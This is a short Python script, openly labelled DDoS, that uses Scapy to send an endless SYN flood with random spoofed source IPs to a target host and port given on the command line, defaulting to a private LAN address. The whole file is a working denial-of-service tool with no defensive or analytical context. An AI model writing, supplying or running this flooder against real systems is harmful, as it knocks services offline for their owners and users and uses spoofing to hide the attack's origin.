#!/usr/bin/env python3
"""
DDoS — distributed SYN flood with SPOOFED random source IPs (Scapy).
Simulates many attacking hosts: each packet carries a different source IP,
so the victim sees a flood from thousands of distinct addresses.

Usage: python ddos.py [target] [port] [--duration N]
Default: target=192.168.1.195 port=80
"""
import sys, time
from scapy.all import IP, TCP, UDP, RandShort, RandIP, conf

target = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else "192.168.1.195"
port   = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else 80
dur    = None
if "--duration" in sys.argv:
    dur = int(sys.argv[sys.argv.index("--duration") + 1])

print(f"[DDoS] spoofed-source SYN flood -> {target}:{port}  (Ctrl+C to stop)", flush=True)
sock, start, n = conf.L3socket(), time.time(), 0
try:
    while True:
        pkt = IP(src=str(RandIP()), dst=target)/TCP(
            sport=int(RandShort()), dport=port, flags="S",
            seq=int(RandShort()), window=64240)
        sock.send(pkt); n += 1
        if n % 1000 == 0:
            print(f"  sent {n}  (~{n/(time.time()-start):.0f}/s)  spoofed sources", flush=True)
        if dur and time.time() - start >= dur:
            break
except KeyboardInterrupt:
    pass
print(f"\n[DDoS] stopped — {n} packets from spoofed IPs in {time.time()-start:.1f}s", flush=True)
